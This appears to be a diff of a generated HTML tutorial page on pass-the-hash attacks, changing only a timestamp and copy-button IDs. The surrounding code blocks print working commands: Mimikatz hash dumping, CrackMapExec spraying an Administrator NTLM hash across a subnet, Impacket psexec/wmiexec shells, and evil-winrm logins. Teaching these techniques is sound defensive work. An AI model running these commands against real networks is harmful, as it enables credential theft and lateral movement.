@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:15 -->
+<!-- 2026-07-30 Thu 22:25 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Pass-the-Hash</title>
@@ -960,11 +960,11 @@ Before passing a hash, an attacker must first harvest it. This is commonly done 
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_c4a230dd52e94b6a9084bc157c110c5c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_35c24c4f96d3415da23de04cc20407f0>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_c4a230dd52e94b6a9084bc157c110c5c=document.querySelector('button[name=btn_c4a230dd52e94b6a9084bc157c110c5c]');
-copyBtnbtn_c4a230dd52e94b6a9084bc157c110c5c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Using Mimikatz to dump NTLM hashes from memory\nsekurlsa::logonpasswords\n`);copyBtnbtn_c4a230dd52e94b6a9084bc157c110c5c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c4a230dd52e94b6a9084bc157c110c5c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_35c24c4f96d3415da23de04cc20407f0=document.querySelector('button[name=btn_35c24c4f96d3415da23de04cc20407f0]');
+copyBtnbtn_35c24c4f96d3415da23de04cc20407f0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Using Mimikatz to dump NTLM hashes from memory\nsekurlsa::logonpasswords\n`);copyBtnbtn_35c24c4f96d3415da23de04cc20407f0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_35c24c4f96d3415da23de04cc20407f0.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -994,11 +994,11 @@ CrackMapExec (CME) is a popular tool for lateral movement. An attacker can use t
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8102e11d6ce749d8a2f61d181d2cc45d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f4dcd81d2aa64b22ac81061a44743f3a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8102e11d6ce749d8a2f61d181d2cc45d=document.querySelector('button[name=btn_8102e11d6ce749d8a2f61d181d2cc45d]');
-copyBtnbtn_8102e11d6ce749d8a2f61d181d2cc45d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Attempt to authenticate to an entire subnet using the Administrator hash\ncme smb 192.168.1.0/24 -u Administrator -H 2b5762c448386345672224090018678d\n\n# Confirm which hosts accepted the hash before attempting further action\ncme smb 192.168.1.0/24 -u Administrator -H 2b5762c448386345672224090018678d --shares\n`);copyBtnbtn_8102e11d6ce749d8a2f61d181d2cc45d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8102e11d6ce749d8a2f61d181d2cc45d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f4dcd81d2aa64b22ac81061a44743f3a=document.querySelector('button[name=btn_f4dcd81d2aa64b22ac81061a44743f3a]');
+copyBtnbtn_f4dcd81d2aa64b22ac81061a44743f3a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Attempt to authenticate to an entire subnet using the Administrator hash\ncme smb 192.168.1.0/24 -u Administrator -H 2b5762c448386345672224090018678d\n\n# Confirm which hosts accepted the hash before attempting further action\ncme smb 192.168.1.0/24 -u Administrator -H 2b5762c448386345672224090018678d --shares\n`);copyBtnbtn_f4dcd81d2aa64b22ac81061a44743f3a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f4dcd81d2aa64b22ac81061a44743f3a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1019,11 +1019,11 @@ Using the Impacket library, an attacker can get a full command-line shell on a r
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6e6e9210e2724751ba56be51aec215c8>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_c3c25462769d4e96b7e8fb9e01605e18>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_6e6e9210e2724751ba56be51aec215c8=document.querySelector('button[name=btn_6e6e9210e2724751ba56be51aec215c8]');
-copyBtnbtn_6e6e9210e2724751ba56be51aec215c8.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Using psexec.py to gain a SYSTEM shell on a remote target\npython3 psexec.py -hashes :2b5762c448386345672224090018678d Administrator@192.168.1.50\n\n# wmiexec.py — quieter alternative, doesn't drop a service binary\n# to disk the way psexec.py does\npython3 wmiexec.py -hashes :2b5762c448386345672224090018678d Administrator@192.168.1.50\n`);copyBtnbtn_6e6e9210e2724751ba56be51aec215c8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6e6e9210e2724751ba56be51aec215c8.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_c3c25462769d4e96b7e8fb9e01605e18=document.querySelector('button[name=btn_c3c25462769d4e96b7e8fb9e01605e18]');
+copyBtnbtn_c3c25462769d4e96b7e8fb9e01605e18.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Using psexec.py to gain a SYSTEM shell on a remote target\npython3 psexec.py -hashes :2b5762c448386345672224090018678d Administrator@192.168.1.50\n\n# wmiexec.py — quieter alternative, doesn't drop a service binary\n# to disk the way psexec.py does\npython3 wmiexec.py -hashes :2b5762c448386345672224090018678d Administrator@192.168.1.50\n`);copyBtnbtn_c3c25462769d4e96b7e8fb9e01605e18.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c3c25462769d4e96b7e8fb9e01605e18.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1046,11 +1046,11 @@ directly rather than requiring a plaintext password.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_997fc23a28d04476ba74d44374550001>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_aa1ec158323542358c1fdcfab6ad539d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_997fc23a28d04476ba74d44374550001=document.querySelector('button[name=btn_997fc23a28d04476ba74d44374550001]');
-copyBtnbtn_997fc23a28d04476ba74d44374550001.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`evil-winrm -i 192.168.1.50 -u Administrator -H 2b5762c448386345672224090018678d\n`);copyBtnbtn_997fc23a28d04476ba74d44374550001.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_997fc23a28d04476ba74d44374550001.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_aa1ec158323542358c1fdcfab6ad539d=document.querySelector('button[name=btn_aa1ec158323542358c1fdcfab6ad539d]');
+copyBtnbtn_aa1ec158323542358c1fdcfab6ad539d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`evil-winrm -i 192.168.1.50 -u Administrator -H 2b5762c448386345672224090018678d\n`);copyBtnbtn_aa1ec158323542358c1fdcfab6ad539d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_aa1ec158323542358c1fdcfab6ad539d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
